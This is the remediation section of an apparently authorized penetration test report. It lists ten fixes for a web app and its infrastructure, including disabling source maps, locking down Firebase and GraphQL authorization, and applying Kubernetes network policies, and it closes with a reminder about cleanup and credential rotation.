1. **Remove source maps from production immediately** — add `"sourceMap": false` to your Parcel/Webpack config
2. **Lock down Firebase Storage** — implement proper security rules, deny all public access
3. **Rotate all credentials** — especially any password that's been typed into a chat, committed to source, or reused across services
4. **Add authorization checks to every GraphQL resolver** — not just "is user authenticated" but "does this user own this resource"
5. **Restrict token generation mutations** — `generateCustomToken` and `generateCLIToken` should require admin scopes
6. **Apply NetworkPolicy to every Kubernetes namespace** — default-deny egress, allow only explicitly required service communication
7. **Never run pods as root** — add `securityContext: { runAsNonRoot: true }` to all pod specs
8. **Authenticate Lambda/serverless endpoints** — serverless-functions should not be publicly accessible without auth
9. **Sanitize chat messages** — add DOMPurify before any `unsafeHTML()` rendering
10. **Never paste credentials into AI assistants** — they're stored permanently in the conversation history and may be accessible to other users

---

*This penetration test was conducted with authorization. All proof-of-concept files, accounts, and Lambda functions created during testing should be cleaned up by the project owner. The admin password and all generated tokens should be rotated immediately.*
